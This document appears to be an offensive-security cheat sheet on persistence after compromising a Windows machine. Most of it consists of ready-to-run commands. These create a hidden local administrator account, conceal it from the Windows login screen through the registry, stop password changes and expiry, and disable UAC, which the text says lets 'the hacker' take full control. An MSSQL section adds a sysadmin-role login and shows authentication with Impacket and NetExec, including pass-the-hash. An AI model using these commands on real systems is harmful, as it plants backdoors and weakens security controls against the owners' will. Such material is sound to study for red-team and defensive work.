# Manual

Normally you wouldn't create an account since it is intrusive but hackers had to avoid writing malware on disk as much as possible. Choose your decisions wisely.

## 01 - Command Prompt

```
C:\> net user sysadmin s3cur3d+1T /add /y

C:\> net localgroup Administrators sysadmin /add /y
```

Makes the user account invisible from the Windows Login screen

`C:\> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v sysadmin /t REG_DWORD /d 0 /f`

Sometimes it's a bit annoying when losing access that somebody changed the password whatever if it's on purpose or accidental. This `/passwordchg:<YES | NO>` option will prevent it from happening.

`C:\> net user sysadmin /passwordchg:no`

Never expire the password (this command is intrusive so be careful)

`C:\> net accounts /maxpwage:unlimited`

Persistence method to add user account

`C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v MS_BACKUP /t REG_DWORD /d 0 /f`

Disabling UAC that allows the hacker to take full control

`C:\> reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f`

Enabling UAC to make the admin restrictive

`C:\> reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f`

## 02 - Powershell

```powershell
PS C:\> $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
New-LocalUser -Name sysadmin -Password $password
Add-LocalGroupMember -Groups Administrators -Member "sysadmin"
```

## 03 - MSSQL

TODO: Fill this info

### 3.1 - SQSH

```
$ sqsh -S <IP> -U <username> -P "<password>"
 
1> CREATE LOGIN <username> WITH PASSWORD = '<password>';
2> sp_addsrvrolemember '<username>', 'sysadmin';
3> go
```

### 3.2 - SQLCMD

```
C:\> sqlcmd [-S <IP>] -E -Q
```

### 3.3 - Impacket

```
$ mssqlclient.py -port 1433 -windows-auth <domain>/<username>:<password>@<IP>

$ mssqlclient.py -port 1433 -windows-auth <domain>/<username>@<IP> -hashes :<nt_hash>
```

### 3.4 - NetExec

```
$ netexec mssql -u "<username>" -p "<password>" [-d <domain> | --local-auth]

$ netexec mssql -u "<username>" -H "<nt_hash>" [-d <domain> | --local-auth]
```